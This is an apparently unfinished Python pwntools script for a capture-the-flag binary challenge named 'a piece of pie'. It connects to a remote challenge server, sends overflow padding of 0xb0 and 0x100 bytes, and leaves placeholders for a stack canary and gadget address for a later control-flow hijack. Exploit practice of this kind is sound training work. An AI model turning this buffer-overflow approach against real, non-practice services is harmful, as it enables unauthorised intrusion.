from pwn import *

port =  21785
rem = remote("srv1.kitriwhs.kr", port)

elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
base_to_gadget = elf.symbols["gadget"]

# libc = ELF('./WHS/a piece of pie/problem/libc.so.6')

payload = b"A" * 0xb0
rem.sendlineafter(b"name: ", payload)
print(rem.recvline())


payload = b"A" * 0x100
rem.sendlineafter(b"1: ", payload)
print(rem.recvline())

canary = b""
gadget = b""
payload = b"A"
rem.sendlineafter(b"2: ", payload)
print(rem.recvline())
# print(rem.recvline().hex()[-14 : -2])
# rem.sendlineafter(b"3: ", payload)
